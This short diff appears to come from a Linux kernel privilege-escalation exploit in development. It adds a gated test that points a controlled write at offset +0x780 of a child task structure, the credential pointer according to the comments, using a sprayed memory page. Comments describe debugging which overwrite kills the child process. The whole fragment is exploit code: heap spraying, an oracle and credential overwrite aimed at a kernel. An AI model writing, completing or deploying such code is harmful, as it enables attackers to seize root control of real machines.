@@ -445,6 +445,21 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
+        if (env_flag("MODE4_SAME_CRED", 0) && g_child_task) {
+          /* TEST A/C (09-20 decisive): write a QUIET PAGE value into
+           * +0x780 — not the original cred (can't read it), but our
+           * own spray page (the PROVEN-safe value from the bootid
+           * oracle). This tests: does ANY write to +0x780 kill the
+           * child, or specifically a cred-content write?
+           *   Child dies → the write EVENT at +0x780 is the killer
+           *   Child lives → cred CONTENT was the killer (caps cred) */
+          g_main_pc = (uint64_t)page_base; /* quiet spray page */
+          g_main_left = (uint64_t)(g_child_task + 0x780);
+          pr_info("JC2 QUIET_CRED: pc=%016llx (quiet page) "
+                  "left=%016llx (child+0x780) — tests write-event kill\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
       }
       /*
        * word6 (task): MUST be the waiter thread's own task — our 5.10
